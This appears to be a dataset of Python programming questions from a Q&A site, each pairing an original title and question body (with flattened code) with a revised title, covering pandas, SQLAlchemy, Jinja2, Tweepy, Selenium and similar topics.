How to apply hierarchy or multi-index to panda columns," I have seen lots of examples on how to arrange dataframe row indexes hierarchically, but I am trying to do the same for columns and am not understanding the syntax:Given: What I would like to do is add a hierarchical index or even something akin to a tag to the columns, so that they looked something like this: <code>  df = pd.DataFrame(np.random.randn(10,10), columns=['consumption', 'voltage', 'consumption', 'voltage', 'temperature', 'humidity', 'consumption', 'voltage','temperature','humidity'], index= pd.date_range('20000103',periods=10))>>> df consumption voltage consumption voltage temperature \2000-01-03 -1.327735 -1.440285 0.317122 -1.120105 1.736651 2000-01-04 0.132531 0.646972 2.296734 0.332154 -0.541792 2000-01-05 0.127623 0.592778 0.162096 0.107398 -0.628785 2000-01-06 -1.441151 0.215424 0.021068 0.683085 -0.783994 2000-01-07 -0.157848 1.566780 0.599017 -0.628216 0.500251 2000-01-08 -0.498926 0.338771 0.400159 1.571975 0.255635 2000-01-09 0.516618 -1.936360 0.199388 -0.110415 2.690859 2000-01-10 -0.779012 -1.310022 -1.207503 0.095679 -0.134244 2000-01-11 0.644262 0.068196 1.041745 -0.444408 -0.751595 2000-01-12 -0.608046 0.506588 -1.003893 0.473716 0.211991 humidity consumption voltage temperature humidity 2000-01-03 0.039869 1.875807 0.129065 0.132419 0.572678 2000-01-04 1.997363 0.543881 -1.235036 1.155389 1.282912 2000-01-05 -0.458992 0.371589 0.698094 0.695067 -1.095875 2000-01-06 2.512991 0.795234 1.220327 -0.688820 0.875705 2000-01-07 0.263855 -1.253786 -0.308674 1.000057 1.474928 2000-01-08 -0.614560 -0.398284 1.307488 -0.002438 1.572630 2000-01-09 0.363889 2.571522 1.048124 2.574866 -0.417247 2000-01-10 -0.125377 1.004011 1.312716 -2.036689 0.557569 2000-01-11 -0.818585 -0.595743 1.106869 -2.226666 -0.679508 2000-01-12 0.705707 -0.959365 0.689911 0.498411 -0.353557 BUILDING 1DEVICETYPE METER METER WEATHERDEVICEID A B AFIELD consumption voltage consumption voltage temperature \ 2000-01-03 -1.327735 -1.440285 0.317122 -1.120105 1.736651 2000-01-04 0.132531 0.646972 2.296734 0.332154 -0.541792 2000-01-05 0.127623 0.592778 0.162096 0.107398 -0.628785 2000-01-06 -1.441151 0.215424 0.021068 0.683085 -0.783994 2000-01-07 -0.157848 1.566780 0.599017 -0.628216 0.500251 2000-01-08 -0.498926 0.338771 0.400159 1.571975 0.255635 2000-01-09 0.516618 -1.936360 0.199388 -0.110415 2.690859 2000-01-10 -0.779012 -1.310022 -1.207503 0.095679 -0.134244 2000-01-11 0.644262 0.068196 1.041745 -0.444408 -0.751595 2000-01-12 -0.608046 0.506588 -1.003893 0.473716 0.211991 BUILDING 2DEVICETYPE METER WEATHERDEVICEID A A humidity consumption voltage temperature humidity 2000-01-03 0.039869 1.875807 0.129065 0.132419 0.572678 2000-01-04 1.997363 0.543881 -1.235036 1.155389 1.282912 2000-01-05 -0.458992 0.371589 0.698094 0.695067 -1.095875 2000-01-06 2.512991 0.795234 1.220327 -0.688820 0.875705 2000-01-07 0.263855 -1.253786 -0.308674 1.000057 1.474928 2000-01-08 -0.614560 -0.398284 1.307488 -0.002438 1.572630 2000-01-09 0.363889 2.571522 1.048124 2.574866 -0.417247 2000-01-10 -0.125377 1.004011 1.312716 -2.036689 0.557569 2000-01-11 -0.818585 -0.595743 1.106869 -2.226666 -0.679508 2000-01-12 0.705707 -0.959365 0.689911 0.498411 -0.353557 ",How to apply hierarchy or multi-index to pandas columns
"Error in SQLAlchemy with Declarative Base: ""object() takes no parameters"""," I suddenly started seeing an error in my Python SQLAlchemy application and I can't figure out what's causing it. My code looks like this: And when I run this script I get the following error: I am using SQLAlchemy 0.9.1. My backend is MySQL running on the localhost. As far as I can tell by inspecting with pdb connection, session, Base, Column, and Integer all seem normal. <code>  from sqlalchemy import create_enginefrom sqlalchemy import Columnfrom sqlalchemy import ForeignKeyfrom sqlalchemy import Integerfrom sqlalchemy import MetaDatafrom sqlalchemy.ext.declarative import declarative_basedef loadConnection(connection_string, echo=False): engine = create_engine(connection_string, echo=echo) Base = declarative_base(engine) Session = sessionmaker(bind=engine) session = Session() return session, Baseconnection = yaml.load('connection.yaml')session, Base = loadConnection(connection['connection'], connection['echo'])class Foo(Base): __tablename__ = 'foo' id = Column(Integer(11), primary_key=True) Traceback (most recent call last): File ""ephem/database_interface.py"", line 52, in <module> class Foo(Base): File ""ephem/database_interface.py"", line 54, in Foo id = Column(Integer(11), primary_key=True)TypeError: object() takes no parameters","Error in SQLAlchemy with Integer: ""object() takes no parameters"""
Jinja2 - Replace block within super call?," I have a base template which includes a block for the default <head> content. Within the head block, there's a block for the <title>.For example, in the base file I would have: In the child template, I would like to include everything that was in the head block from the base (by calling {{ super()) }} and include some additional things, yet at the same time replace the title block within the super call.Is there a way to do this without just putting a block around the rest of the head content (excluding the title) and just replacing all of that? <code>  <head> {% block head %} {% block title %}<title>An App</title>{% endblock title %} <script src=""somescript.js""></script> {% endblock head %}</head>",replace block within {{ super() }}
How to plot a pandas multiindex dataFrame with al xticks," I have a pandas dataFrame like this: date being the index.I reduce the values to months using: which outputs: Now when I plot this dataFrame, I want the x-axis show every month/year as a tick. I have tries setting xticks but it doesn't seem to work. How could this be achieved? This is my current plot using dataFrame.plot(): <code>  contentdate 2013-12-18 12:30:00 12013-12-19 10:50:00 12013-12-24 11:00:00 02014-01-02 11:30:00 12014-01-03 11:50:00 02013-12-17 16:40:00 102013-12-18 10:00:00 02013-12-11 10:00:00 02013-12-18 11:45:00 02013-12-11 14:40:00 42010-05-25 13:05:00 02013-11-18 14:10:00 02013-11-27 11:50:00 32013-11-13 10:40:00 02013-11-20 10:40:00 12008-11-04 14:49:00 12013-11-18 10:05:00 02013-08-27 11:00:00 02013-09-18 16:00:00 02013-09-27 11:40:00 0 dataFrame = dataFrame.groupby([lambda x: x.year, lambda x: x.month]).agg([sum]) content sum2006 3 66 4 65 5 48 6 87 7 37 8 54 9 73 10 74 11 53 12 452007 1 28 2 40 3 95 4 63 5 56 6 66 7 50 8 49 9 18 10 28",How to plot a pandas multiindex dataFrame with all xticks
Shiping *.so and binaries while building rpm package," I have created a python application in which I would like to ship .so and some binary files in the final RPM package. After long reading I found a way to add binaries/ image and other data files in setup.py. Now, when I build an RPM with python setup.py bdist_rpm command, it complains about architecture dependency: After googling I found that we can add: or removing the line BuildArch: noarch in the packagename.spec file to overcome the rpmbuild failure. However, every time I add or remove line from build/bdist.linux-i686/rpm/SPECS/packagename.spec the command python setup.py bdist_rpm always overwrites the .spe file.Is there a way to avoid Arch dependent binaries and ship *.so and other binary files in rpm? <code>  Arch dependent binaries in noarch packageerror: command 'rpmbuild' failed with exit status 1 #%define _binaries_in_noarch_packages_terminate_build 0",Shipping *.so and binaries while building RPM package
List of pandas options, I couldn't find a list of options for pandas.set_option(). Does anyone know if such a list exists?The best I could find is this page : http://pandas.pydata.org/pandas-docs/dev/whatsnew.html <code> ,List of pandas options for method set_option
Avoid twitter api limitation with Tweepy," I saw in some question on Stack Exchange that the limitation can be a function of the number of requests per 15 minutes and depends also on the complexity of the algorithm, except that this is not a complex one.So I use this code: I always get the Twitter limitation error: <code>  import tweepyimport sqlite3import timedb = sqlite3.connect('data/MyDB.db')# Get a cursor objectcursor = db.cursor()cursor.execute('''CREATE TABLE IF NOT EXISTS MyTable(id INTEGER PRIMARY KEY, name TEXT, geo TEXT, image TEXT, source TEXT, timestamp TEXT, text TEXT, rt INTEGER)''')db.commit()consumer_key = """"consumer_secret = """"key = """"secret = """"auth = tweepy.OAuthHandler(consumer_key, consumer_secret)auth.set_access_token(key, secret)api = tweepy.API(auth)search = ""#MyHashtag""for tweet in tweepy.Cursor(api.search, q=search, include_entities=True).items(): while True: try: cursor.execute('''INSERT INTO MyTable(name, geo, image, source, timestamp, text, rt) VALUES(?,?,?,?,?,?,?)''',(tweet.user.screen_name, str(tweet.geo), tweet.user.profile_image_url, tweet.source, tweet.created_at, tweet.text, tweet.retweet_count)) except tweepy.TweepError: time.sleep(60 * 15) continue breakdb.commit()db.close() Traceback (most recent call last): File ""stream.py"", line 25, in <module> include_entities=True).items(): File ""/usr/local/lib/python2.7/dist-packages/tweepy/cursor.py"", line 153, in next self.current_page = self.page_iterator.next() File ""/usr/local/lib/python2.7/dist-packages/tweepy/cursor.py"", line 98, in next data = self.method(max_id = max_id, *self.args, **self.kargs) File ""/usr/local/lib/python2.7/dist-packages/tweepy/binder.py"", line 200, in _call return method.execute() File ""/usr/local/lib/python2.7/dist-packages/tweepy/binder.py"", line 176, in execute raise TweepError(error_msg, resp)tweepy.error.TweepError: [{'message': 'Rate limit exceeded', 'code': 88}]",Avoid Twitter API limitation with Tweepy
Python: why there is no early termination in bitwise operations?," The output: since the ""1 or func()"" terminates early without calling the func() because ""1 or something"" is always true.However, when switching to bitwise operator: I get the output: Why is that? this doesn't seem very efficient <code>  def func(): print 'no early termination' return 0if __name__ == ""__main__"": if 1 or func(): print 'finished' finished def func(): print 'no early termination' return 0if __name__ == ""__main__"": if 1 | func(): print 'finished' no early terminationfinished",Why there is no early termination in bitwise operations?
ReferenceError: something is not defined in QML," I have Main.qml file like this: in python file, i have this(i use form PyQt5): this python code print this for config: when i run this code, my rectangle color change correctly, but i have this error: but i don't know why this error happend, how i can fix this error? <code>  import QtQuick 2.0 Rectangle { color: ggg.Colors.notificationMouseOverColor width: 1024 height: 768} App = QGuiApplication(sys.argv)View = QQuickView()View.setSource(QUrl('views/sc_side/Main.qml'))Context = View.rootContext()GlobalConfig = Config('sc').getGlobalConfig()print (GlobalConfig, type(GlobalConfig))Context.setContextProperty('ggg', GlobalConfig)View.setResizeMode(QQuickView.SizeRootObjectToView)View.showFullScreen()sys.exit(App.exec_()) {'Colors': {'chatInputBackgroundColor': '#AFAFAF', 'sideButtonSelectedColor': '#4872E8', 'sideButtonTextColor': '#787878', 'sideButtonSelectedTextColor': '#E2EBFC', 'sideButtonMouseOverColor': '#DDDDDD', 'buttonBorderColor': '#818181', 'notificationMouseOverColor': '#383838', }} <class 'dict'> file:///.../views/sc_side/Main.qml:6: ReferenceError: ggg is not defined","ReferenceError: ""something"" is not defined in QML"
Global variables vs dereferenced variables," Functions declared at module level never have a closure and access non-local variables via LOAD_GLOBAL.Functions declared not at module level may have a closure and access non-local, variables via LOAD_DEREF if those variables are not global.So basically we have three ways of storing and loading variables GLOBAL (global), FAST (local) and DEREF (non-local, enclosed, covered).Why the GLOBAL? Wouldn't FAST and DEREF suffice, if you let all functions have their closures? Is there some important difference between a non-local variable and global variable I fail to spot? Is this maybe due to performance issues, as perhaps global variables (like all functions and classes (including their methods) defined at module level plus the builtins) are generally more common than non-local variables? <code> ",Implementation of Global variables vs Dereferenced variables
Returning multiple elements from a list," I have a piece of my code where I'm supposed to create a switchboard. I want to return a list of all the switches that are on. Here ""on"" will equal True and ""off"" equal False. So now I just want to return a list of all the True values and their position. This is all I have but it only return the position of the first occurrence of True (this is just a portion of my code): This only returns ""4"" <code>  self.states = [False, False, False, False, True, True, False, True, False, False, False, False, False, False, False, False]def which_switch(self): x = [self.states.index(i) for i in self.states if i == True]",Getting indices of True values in a boolean list
Edit distance between unsorted and sorted lists," Let A be a list and S a sorted list of the same elements. Assume all elements are different. How do I find a minimal set of ""moves"" (move X before Y (or end)) that turns A into S?Examples: I prefer javascript or python, but any language will do. <code>  A = [8,1,2,3]S = [1,2,3,8]A => S requires one move: move 8 before endA = [9,1,2,3,0]S = [0,1,2,3,9]A => S requires two moves: move 9 before 0 move 0 before 1",Finding minimal distance between unsorted and sorted lists
Behave: Re-use steps between different features," I have just started using behave, a Pythonic BDD framework using Gherkin syntax. behave takes a feature, e.g.: And a steps file, e.g.: And combines them to a beautiful test resport:Some of these steps - like:metadata response is JSONresponse status code is {expected_status_code} Are used in many of my projects, and I would like to group them into a general steps file which I can import and reuse.I tried extracting useful steps to a separate file and importing it, but received the following error: How do I create a generic steps file and import it? <code>  Scenario: Calling the metadata API Given A matching server When I call metadata Then metadata response is JSON And response status code is 200 ...@then('response status code is {expected_status_code}')def step_impl(context, expected_status_code): assert_equals(context.response.status_code, int(expected_status_code))@then('metadata response is JSON')def step_impl(context): json.loads(context.metadata_response.data)... @then('response status code is {expected_status_code}')NameError: name 'then' is not defined",Behave: How to import steps from another file?
Figure size proportions in Matplotlib," My axis labels often look not good (too close to tick labels) when I use Matplotlib.How to set distance between tick labels and axis label? I just need to enlarge distance between ""Number of stars"" label and corresponding tick labels. Maybe latex \vspace{} is working but I don't know how to implement it. fig.subplots_adjust(left=) is not a solution. <code> ",How to change separation between tick labels and axis labels in Matplotlib
Publication-quality figures in Matplotlib," My axis labels often look not good (too close to tick labels) when I use Matplotlib.How to set distance between tick labels and axis label? I just need to enlarge distance between ""Number of stars"" label and corresponding tick labels. Maybe latex \vspace{} is working but I don't know how to implement it. fig.subplots_adjust(left=) is not a solution. <code> ",How to change separation between tick labels and axis labels in Matplotlib
Distances between figures and between figures and axes labels in Matplotlib," My axis labels often look not good (too close to tick labels) when I use Matplotlib.How to set distance between tick labels and axis label? I just need to enlarge distance between ""Number of stars"" label and corresponding tick labels. Maybe latex \vspace{} is working but I don't know how to implement it. fig.subplots_adjust(left=) is not a solution. <code> ",How to change separation between tick labels and axis labels in Matplotlib
Distances between between figures and axes labels in Matplotlib," My axis labels often look not good (too close to tick labels) when I use Matplotlib.How to set distance between tick labels and axis label? I just need to enlarge distance between ""Number of stars"" label and corresponding tick labels. Maybe latex \vspace{} is working but I don't know how to implement it. fig.subplots_adjust(left=) is not a solution. <code> ",How to change separation between tick labels and axis labels in Matplotlib
Set default selected value for QuerySelectField in WTForms," This [example][1] to set up a form with WTForms and SQLAlchemy in Flask and add a QuerySelectField to the form works. I am not using flask.ext.sqlalchemy, my code: Now I want to set the default value of the QuerySelectField's selectlist. Tried passing a default kwarg in QuerySelectField and setting selected attributes. Nothing worked. Am I missing something obvious? Can someone help? <code>  ContentForm = model_form(Content, base_class=Form)ContentForm.author = QuerySelectField('Author', get_label=""name"")myform = ContentForm(request.form, content)myform.author.query = query_get_all(Authors)",SQLAlchemy/WTForms: set default selected value for QuerySelectField
pip executes a wrong version of platforms.py inside virtual env," I create a virtual enviroment with virtualenvwrapper and then I try to install django in it with pip. However I keep getting an error due to a conflict in python versions. In the system, I am running python anaconda: and the $PATH is set to while inside the virtual enviroment, the python version is: and the $PATH: I understand that the problem is that inside the virtual enviroment, while executing the non anaconda python 2.7.5, it is still using platforms.py from anaconda library, causing the crash in the evaluation of the regex as suggested here. I do not care which python version to use inside the virtual enviroment. Any suggestion on how to tell the python of inside the virtual enviroment the correct platforms.py to use?Thanks! <code>  $ mkvirtualenv env$ workon env$ pip install djangoDownloading/unpacking djangoCleaning up...Exception:Traceback (most recent call last): File ""/Users/mingot/virtualenvs/env/lib/python2.7/site-packages/pip/basecommand.py"", line 134, in main status = self.run(options, args) File ""/Users/mingot/virtualenvs/env/lib/python2.7/site-packages/pip/commands/install.py"", line 236, in run requirement_set.prepare_files(finder, force_root_egg_info=self.bundle, bundle=self.bundle) File ""/Users/mingot/virtualenvs/env/lib/python2.7/site-packages/pip/req.py"", line 1085, in prepare_files url = finder.find_requirement(req_to_install, upgrade=self.upgrade) File ""/Users/mingot/virtualenvs/env/lib/python2.7/site-packages/pip/index.py"", line 201, in find_requirement page = self._get_page(main_index_url, req) File ""/Users/mingot/virtualenvs/env/lib/python2.7/site-packages/pip/index.py"", line 554, in _get_page return HTMLPage.get_page(link, req, cache=self.cache) File ""/Users/mingot/virtualenvs/env/lib/python2.7/site-packages/pip/index.py"", line 671, in get_page resp = urlopen(url) File ""/Users/mingot/virtualenvs/env/lib/python2.7/site-packages/pip/download.py"", line 176, in __call__ response = self.get_opener(scheme=scheme).open(url) File ""/Users/mingot/virtualenvs/env/lib/python2.7/site-packages/pip/download.py"", line 238, in get_opener headers.append((""User-agent"", build_user_agent())) File ""/Users/mingot/virtualenvs/env/lib/python2.7/site-packages/pip/download.py"", line 35, in build_user_agent _implementation = platform.python_implementation() File ""/Users/mingot/soft/anaconda/lib/python2.7/platform.py"", line 1486, in python_implementation return _sys_version()[0] File ""/Users/mingot/soft/anaconda/lib/python2.7/platform.py"", line 1451, in _sys_version repr(sys_version))ValueError: failed to parse CPython sys.version: '2.7.5 (default, Aug 25 2013, 00:04:04) \n[GCC 4.2.1 Compatible Apple LLVM 5.0 (clang-500.0.68)]' $ python Python 2.7.5 |Anaconda 1.8.0 (x86_64)| (default, Oct 24 2013, 07:02:20) [GCC 4.0.1 (Apple Inc. build 5493)] on darwin /Users/mingot/soft/anaconda/bin:/usr/local/bin:/usr/local/sbin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/texbin:/opt/X11/bin (env)$ pythonPython 2.7.5 (default, Aug 25 2013, 00:04:04) [GCC 4.2.1 Compatible Apple LLVM 5.0 (clang-500.0.68)] on darwin /Users/mingot/virtualenvs/env/bin:/Users/mingot/soft/anaconda/bin:/usr/local/bin:/usr/local/sbin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/texbin:/opt/X11/bin",pip executes the wrong python library versions inside virtual env
Difference between super() and calling directly," In Python 2.7 and 3, I use the following method to call a super-class's function: I see it's also possible to replace B.__init__(self) with super(B, self).__init__() and in python3 super().__init__().Are there any advantages or disadvantages to doing this either way? It makes more sense to call it from B directly for me at least, but maybe there's a good reason where super() can only be used when using metaclasses (which I generally avoid). <code>  class C(B): def __init__(self): B.__init__(self)",Difference between super() and calling superclass directly
python + selenium: find and click an item from 'onclick' partial value," Is it possible to click an element through selenium by a partial value of an onclick element?There are multiple input items on a page, and I only need to select one with a specific string.Examples would be: If you notice towards the end, there is a ""1 Bedroom Deluxe"", ""2 Bedroom Deluxe"", and ""1 Bedroom Presidential"". Since it is an input item, there isn't any text that I would be able to filter by, but I need to only select a specific item, such as the 2 Bedroom Deluxe.Is there anything I could do in the sense of: something or another? I'm currently using beautifulsoup4 to also parse the html on the page and retrieve text that is associated with the item, so i don't know if that could be incorporated at all. Visually, the page is an HTML table that is in the format of: EDIT:I guess posted this too soon. Right after, a coworked came up and suggested finding the element by Xpath with: <code>  <input name=""booksubmit"" type=""button"" class=""searchAvailBtnSelect"" value=""Select"" onclick=""setTimeout('disableSelect()',1);bookNowSubmit('0165','1BD','000000452014022703S000016500010708F ','101400','156000','3','02/27/2014','false','false','false','false','true','false','false','EXPRESS','63','1 Bedroom Deluxe','false','AC')""><input name=""booksubmit"" type=""button"" class=""searchAvailBtnSelect"" value=""Select"" onclick=""setTimeout('disableSelect()',1);bookNowSubmit('0165','2BD','000000452014022703S000016500010708F ','101400','156000','3','02/27/2014','false','false','false','false','true','false','false','EXPRESS','63','2 Bedroom Deluxe','false','AC')""><input name=""booksubmit"" type=""button"" class=""searchAvailBtnSelect"" value=""Select"" onclick=""setTimeout('disableSelect()',1);bookNowSubmit('0165','1BD','000000452014022703S000016500010708F ','101400','156000','3','02/27/2014','false','false','false','false','true','false','false','EXPRESS','63','1 Bedroom Presidential','false','AC')""> buttons = driver.find_elements_by_name('booksubmit')for button in buttons: if button ........ +--------------------------------------------------------------------+| 1 Bedroom Deluxe | $25 | [button i don't care about] ||------------------------+---------+---------------------------------|| 2 Bedroom Deluxe | $50 | [button i'm trying to click] ||------------------------+---------+---------------------------------|| 1 Bedroom Presidential | $50 | [button i don't care about] |+--------------------------------------------------------------------+ driver.find_element_by_xpath('//input[contains(@onclick,""1 Bedroom Deluxe"")]')",Find and click an item from 'onclick' partial value
Python- Iterate in a loop," I've an iterable list of over 100 elements. I want to do something after every 10th iterable element. I don't want to use a counter variable. I'm looking for some solution which does not includes a counter variable.Currently I do like this: Is there some way in which I can omit counter variable? <code>  count = 0for i in range(0,len(mylist)): if count == 10: count = 0 #do something print i count += 1",Do something every n iterations without using counter variable
"When interating a list, do something every n iterations without using counter variable"," I've an iterable list of over 100 elements. I want to do something after every 10th iterable element. I don't want to use a counter variable. I'm looking for some solution which does not includes a counter variable.Currently I do like this: Is there some way in which I can omit counter variable? <code>  count = 0for i in range(0,len(mylist)): if count == 10: count = 0 #do something print i count += 1",Do something every n iterations without using counter variable
"When iterating a list, do something every n iterations without using counter variable"," I've an iterable list of over 100 elements. I want to do something after every 10th iterable element. I don't want to use a counter variable. I'm looking for some solution which does not includes a counter variable.Currently I do like this: Is there some way in which I can omit counter variable? <code>  count = 0for i in range(0,len(mylist)): if count == 10: count = 0 #do something print i count += 1",Do something every n iterations without using counter variable
tilde True gives minus two - why?, In Python console: Gives me: Why? Can someone explain this particular case to me in binary? <code>  ~True -2,Why does ~True result in -2?
How to get domain of words using wordnet in python?," How can I find domain of words using nltk Python module and WordNet?Suppose I have words like (transaction, Demand Draft, cheque, passbook) and the domain for all these words is ""BANK"". How can we get this using nltk and WordNet in Python?I am trying through hypernym and hyponym relationship:For example: and <code>  from nltk.corpus import wordnet as wnsports = wn.synset('sport.n.01')sports.hyponyms()[Synset('judo.n.01'), Synset('athletic_game.n.01'), Synset('spectator_sport.n.01'), Synset('contact_sport.n.01'), Synset('cycling.n.01'), Synset('funambulism.n.01'), Synset('water_sport.n.01'), Synset('riding.n.01'), Synset('gymnastics.n.01'), Synset('sledding.n.01'), Synset('skating.n.01'), Synset('skiing.n.01'), Synset('outdoor_sport.n.01'), Synset('rowing.n.01'), Synset('track_and_field.n.01'), Synset('archery.n.01'), Synset('team_sport.n.01'), Synset('rock_climbing.n.01'), Synset('racing.n.01'), Synset('blood_sport.n.01')] bark = wn.synset('bark.n.02')bark.hypernyms()[Synset('noise.n.01')]",How to get domain of words using WordNet in Python?
How do get the first value in a python dictionary," I have a dictionary like this: How can I get the first value of each item in my dicitionary?I want in the end a list: <code>  myDict = { 'BigMeadow2_U4': (1609.32, 22076.38, 3.98), 'MooseRun': (57813.48, 750187.72, 231.25), 'Hwy14_2': (991.31, 21536.80, 6.47) } myList = [1609.32,57813.48,991.31]",How to get the first value in a python dictionary
Python - Enable access control on simple http server," I have the following shell script for a very simple HTTP server: I was wondering how I can enable or add a CORS header like Access-Control-Allow-Origin: * to this server? <code>  #!/bin/shecho ""Serving at http://localhost:3000""python -m SimpleHTTPServer 3000",Enable access control on simple HTTP server
Why cannot numpy array convert from datetime to datetime64 implicitely?," Say, I have a datetime: I would like to transform it into np.datetime64: It works well. However, if I have an array of given_time: Both given_times.astype('datetime64') and given_times = np.array([given_time] * 3, dtype=np.datetime64) would trigger TypeError: Cannot cast datetime.datetime object from metadata [us] to [D] according to the rule 'same_kind'So, I have to specify the unit: My question is, why do I have to specify the unit here? It doesn't require unit in np.datatime64 constructor. <code>  given_time = datetime(2013, 10, 8, 0, 0, 33, 945109, tzinfo=psycopg2.tz.FixedOffsetTimezone(offset=60, name=None)) np.datetime64(given_time)> numpy.datetime64('2013-10-08T00:00:33.945109+0100') given_times = np.array([given_time]*3) # dtype is object given_times.astype('datetime64[us]')# orgiven_times = np.array([given_time]*3, dtype='datetime64[us]')",Why cannot numpy arrays convert from datetime to np.datetime64 implicitly?
findind index of maximum value in array," I would like to find a maximum in a float64 array, excluding nan values.I saw np.nanmax function but it doesn't give the index corresponding to the found value.it 's quite strange to scan after to the value specially the function necessarily use the index ??? Can't it be a mistake searching like that . isn't there a way to recover the index directly ? <code> ",Finding index of maximum value in array with NumPy
findind index of maximum value in array in python," I would like to find a maximum in a float64 array, excluding nan values.I saw np.nanmax function but it doesn't give the index corresponding to the found value.it 's quite strange to scan after to the value specially the function necessarily use the index ??? Can't it be a mistake searching like that . isn't there a way to recover the index directly ? <code> ",Finding index of maximum value in array with NumPy
Is there all(map()) optimization in Python?," I'd like to use all(map(func, iterables)), because it is clear, but I'm very interested in whether this approach is optimized? For example, if any calculated result of map() is not True mapping should stop.Example from my project: I prefer to use functional-like style: I there any optimization for all(map(...)) or any(map(...)) in Python?Edit: Python 2.7 on board. <code>  for item in candidate_menu: if not item.is_max_meals_amount_ok(daily_menus): return Falsereturn True all(map(operator.methodcaller('is_max_meals_amount_ok', daily_menus), candidate_menu)",Is there an all(map(...)) optimization in Python?
Jinga2 template not rendering if-elif-else statement properly," I am trying to set the text color using css in a jinja2 template. In the following code I want to set the output string to print in a specific font color if the variable contains a string. Everytime the template is generated though it prints in red due to the else statement, it never see the first two conditions even though the output should be matched, I can tell what the output from the variable is when the table generates and it is as expected. I know my css is correct due to the printing of the string in red by default.My first thought was to enclose the string I was checking for in quotes but that didn't work. Next was that jinja was not expanding RepoOutput[RepoName.index(repo)] but the for loop above it works, RepoName is expanded upon properly. I know if I add the braces it will print the variable which I am fairly certain will either break the template or just not work.I tried looking at these sites and went through the list of global expressions as well but couldn't find any examples similar to mine or a direction in which to look further.http://jinja.pocoo.org/docs/templates/#ifhttp://wsgiarea.pocoo.org/jinja/docs/conditions.html Thanks <code>  {% for repo in RepoName %} <tr> <td> <a href=""http://mongit201.be.monster.com/icinga/{{ repo }}"">{{ repo }}</a> </td> {% if error in RepoOutput[RepoName.index(repo)] %} <td id=error> {{ RepoOutput[RepoName.index(repo)] }} </td> <!-- I want this in green if it is up-to-date, otherwise I want it in red --> {% elif Already in RepoOutput[RepoName.index(repo)] %} <td id=good> {{ RepoOutput[RepoName.index(repo)] }} </td> <!-- I want this in green if it is up-to-date, otherwise I want it in red --> {% else %} <td id=error> {{ RepoOutput[RepoName.index(repo)] }} </td> <!-- I want this in green if it is up-to-date, otherwise I want it in red --> </tr> {% endif %} {% endfor %}",Jinja2 template not rendering if-elif-else statement properly
split string with newline using python," I need to delimit the string which has new line in it. How would I achieve it? Please refer below code.Input: Output desired: I have tried the below approaches: <code>  data = """"""a,b,cd,e,fg,h,ij,k,l"""""" ['a,b,c', 'd,e,f', 'g,h,i', 'j,k,l'] 1. output = data.split('\n')2. output = data.split('/n')3. output = data.rstrip().split('\n')",Split string using a newline delimiter with Python
Split string using a newline delimeter with Python," I need to delimit the string which has new line in it. How would I achieve it? Please refer below code.Input: Output desired: I have tried the below approaches: <code>  data = """"""a,b,cd,e,fg,h,ij,k,l"""""" ['a,b,c', 'd,e,f', 'g,h,i', 'j,k,l'] 1. output = data.split('\n')2. output = data.split('/n')3. output = data.rstrip().split('\n')",Split string using a newline delimiter with Python
making django server accessible in LAN," I have installed Django server and it can be accessed as below suppose My IP is x.x.x.x .From another PC under the same network when I do but it is not working.I can easily ping my IP with that computer.Moreover, on my port 81, I have apache, which is easily accessible like below What can be the issue? Do I need something extra in Django <code>  http://localhost:8000/get-sms/http://127.0.0.1:8000/get-sms/ my-ip:8000/get-sms/ http:///my-ip:81",Making django server accessible in LAN
Is there a way to sort a list in python until the first ordered k elements are found?," I have a normal boring list of non sorted numbers. From that list I need to take the first k elements after sorting. The thing is that if the list is considerably long and k is considerably small sorting the entire list seems like a waste. I came up with an algorithmic solution for this, but requires me to write my own implementation for sorting, my question is: is there a way to get the same efficiency using something already implemented in python?UPDATE:Just to clarify, I know this will give the answer I need: sorted(boring_list)[:n]But my concern is efficiency: I don't need to sort the whole list for this.  <code> ",Is there a way to sort a list in python until the first sorted k elements are found?
python delete substrings from list of strings," I have a list I'm trying to delete strings whose superstring is already in the list. In this case, the result should be: I have written the code: but it doesnt seem to work. I have read that we cannot remove from the list while iterating over it. Hence the copy res, while l is my original list.  <code>  l = ['abc', 'abcdef', 'def', 'defdef', 'polopolo'] ['abcdef', 'defdef', 'polopolo'] l=['abc','abcdef','def','defdef','polopolo']res=['abc','abcdef','def','defdef','polopolo']for each in l: l1=[x for x in l if x!=each] for other in l1: if each in other: res.remove(each)",Delete substrings from a list of strings
Accessing URL from Python," I am trying to use this Python urllib2 Basic Auth Problem bit of code to download a webpage content from an URL which requires authentication. The code I am trying is: It's showing me: I am wondering what I am doing wrong? I am using Python 2.7.5. How can I download file contents from an URL which requires authentication? <code>  import urllib2, base64request = urllib2.Request(""http://api.foursquare.com/v1/user"")base64string = base64.encodestring('%s:%s' % (username, password)).replace('\n', '')request.add_header(""Authorization"", ""Basic %s"" % base64string) result = urllib2.urlopen(request) ./xx.py: line 1: import: command not found./xx.py: line 3: syntax error near unexpected token `('./xx.py: line 3: `request = urllib2.Request(""http://api.foursquare.com/v1/user"")'",./xx.py: line 1: import: command not found
Add element to a json in python," I am trying to add an element to a json file in python but I am not able to do it.This is what I tried untill now (with some variation which I deleted): But, what I get is: Which is fine because I also need this to add a new row instead an element but I want to get something like this: How should I add the new element? <code>  import jsondata = [ { 'a':'A', 'b':(2, 4), 'c':3.0 } ]print 'DATA:', repr(data)var = 2.4data.append({'f':var})print 'JSON', json.dumps(data) DATA: [{'a': 'A', 'c': 3.0, 'b': (2, 4)}]JSON [{""a"": ""A"", ""c"": 3.0, ""b"": [2, 4]}, {""f"": 2.4}] [{'a': 'A', 'c': 3.0, 'b': (2, 4), ""f"":2.4}]",Add element to a JSON file?
How to I free up the memory used by an lxml.etree?," I'm loading data from a bunch of XML files with lxml.etree, but I'd like to close them once I'm done with this initial parsing. Currently the XML_FILES list in the below code takes up 350 MiB of the program's 400 MiB of used memory. I've tried del XML_FILES, del XML_FILES[:], XML_FILES = None, for etree in XML_FILES: etree = None, and a few more, but none of these seem to be working. I also can't find anything in the lxml docs for closing an lxml file. Here's the code that does the parsing: Now, how do I get rid of XML_FILES here? <code>  def open_xml_files(): return [etree.parse(filename) for filename in paths]def load_location_data(xml_files): location_data = {} for xml_file in xml_files: for city in xml_file.findall('City'): code = city.findtext('CityCode') name = city.findtext('CityName') location_data['city'][code] = name # [A few more like the one above] return location_dataXML_FILES = utils.open_xml_files()LOCATION_DATA = load_location_data(XML_FILES)# XML_FILES never used again from this point on",How do I free up the memory used by an lxml.etree?
